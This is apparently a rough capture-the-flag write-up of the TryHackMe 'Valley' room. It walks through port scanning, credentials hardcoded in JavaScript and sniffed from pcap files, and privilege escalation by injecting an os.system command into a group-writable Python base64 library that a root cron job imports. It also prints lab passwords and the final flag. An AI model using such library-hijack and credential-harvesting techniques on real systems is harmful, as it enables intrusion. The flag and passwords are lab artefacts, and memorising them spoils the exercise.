# Valley

## Recon


```{shell}
$ sudo nmap -p- -sS -sV -vv 10.10.109.116

[sudo] password for oriol: 
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-01 18:15 CET
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 18:15
Scanning 10.10.109.116 [4 ports]
Completed Ping Scan at 18:15, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:15
Completed Parallel DNS resolution of 1 host. at 18:15, 13.00s elapsed
Initiating SYN Stealth Scan at 18:15
Scanning 10.10.109.116 [65535 ports]
Discovered open port 80/tcp on 10.10.109.116
Discovered open port 22/tcp on 10.10.109.116
Discovered open port 37370/tcp on 10.10.109.116
Completed SYN Stealth Scan at 18:15, 20.61s elapsed (65535 total ports)
Initiating Service scan at 18:15
Scanning 3 services on 10.10.109.116
Completed Service scan at 18:15, 6.10s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.109.116.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.23s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:15
Completed NSE at 18:15, 0.18s elapsed
Nmap scan report for 10.10.109.116
Host is up, received reset ttl 63 (0.046s latency).
Scanned at 2024-03-01 18:15:10 CET for 41s
Not shown: 65532 closed ports
Reason: 65532 resets
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
37370/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.58 seconds
           Raw packets sent: 65556 (2.884MB) | Rcvd: 65536 (2.621MB)

```

Apache/2.4.41 (Ubuntu) Server at 10.10.193.151 Port 80


Kevin Hughes, kevinh@eit.com, September 1995

```{html}
 <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=A">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=D">Description</a></th></tr>
```

places 

/pricing
/gallery
/static
/icons                  forbidden

inside of pricing was this note 

J,
Please stop leaving notes randomly on the website
-RP

So now we have users J and RP



PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
PUBLIC "-//IETF//DTD HTML 3.2 Final//EN">


This is had to look up:

http://10.10.19.32/static/00

dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts

/dev1243224123123 Turns out to be an admin page for the website. 

by looking at one of the javascripts in the website we can see the credentials for the admin page.

```{javascript}
loginButton.addEventListener("click", (e) => {
    e.preventDefault();
    const username = loginForm.username.value;
    const password = loginForm.password.value;

    if (username === "siemDev" && password === "california") {
        window.location.href = "/dev1243224123123/devNotes37370.txt";
    } else {
        loginErrorMsg.style.opacity = 1;
    }
})
```

it seems also that we have found the user siemDev and the password california

```{shell}

once inside we get the following note:

```{txt}

dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port

```

in there, we find the pcapng files which contain traffic without encryption. Specifically, in siemHTTP2.pcapng we can see the following:

```{http}
uname=valleyDev
psw=ph0t0s1234
remember=on
```

go for the lucky 

```{shell}
$ cat /etc/crontab

# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
1  *    * * *   root    python3 /photos/script/photosEncrypt.py

```

it seems we already have a way to elevate our privileges. since we can actually modify the script, we can add a reverse shell.

```{python}
#!/usr/bin/python3
import base64
for i in range(1,7):
# specify the path to the image file you want to encode
	image_path = "/photos/p" + str(i) + ".jpg"

# open the image file and read its contents
	with open(image_path, "rb") as image_file:
          image_data = image_file.read()

# encode the image data in Base64 format
	encoded_image_data = base64.b64encode(image_data)

# specify the path to the output file
	output_path = "/photos/photoVault/p" + str(i) + ".enc"

# write the Base64-encoded image data to the output file
	with open(output_path, "wb") as output_file:
    	  output_file.write(encoded_image_data)

```

we can't modify the script, but we can modify the images. 

```{shell}
$ find / -type f -name "*base64.*" 2>/dev/null

/usr/share/man/man1/base64.1.gz
/usr/share/mime/application/x-spkac+base64.xml
/usr/lib/python3.8/base64.py
/usr/lib/python3.8/__pycache__/base64.cpython-38.pyc
/snap/core20/1828/usr/lib/python3.8/__pycache__/base64.cpython-38.pyc
/snap/core20/1828/usr/lib/python3.8/base64.py
/snap/core20/1611/usr/lib/python3.8/__pycache__/base64.cpython-38.pyc
/snap/core20/1611/usr/lib/python3.8/base64.py

```

the permissions to get into the folder with the base64 import are located within a user that need to be elevated. 

```{shell}

$ ls -dla /usr/lib/python3.8

drwxrwxr-x 30 root valleyAdmin 20480 Mar 20  2023 ../python3.8
    
$  ls -la base64.py 

-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 base64.py

```

looking into /etc/passwd we can see the following

```{shell}
valley:x:1000:1000:,,,:/home/valley:/bin/bash
siemDev:x:1001:1001::/home/siemDev/ftp:/bin/sh
valleyDev:x:1002:1002::/home/valleyDev:/bin/bash

```
and by looking into /etc/group we can see the following

```{shell}
valleyAdmin:x:1003:valley
valleyDev:x:1002:
valley:x:1000:

```

```{shell}
$ gdb valleyAuthenticator

0x000000000049a405:	call   0x49a45a

```


valley
liberty123


```{shell}
$ ls -la /usr/lib/python3.8/base64.py 
-rwxrwxr-x 1 root valleyAdmin 20382 Mar 13  2023 /usr/lib/python3.8/base64.py
    
```

```{python}
import os

os.system('cat /root/* > /home/valley/hellothere.txt')
```

```{shell}
cat hellothere.txt 
THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
```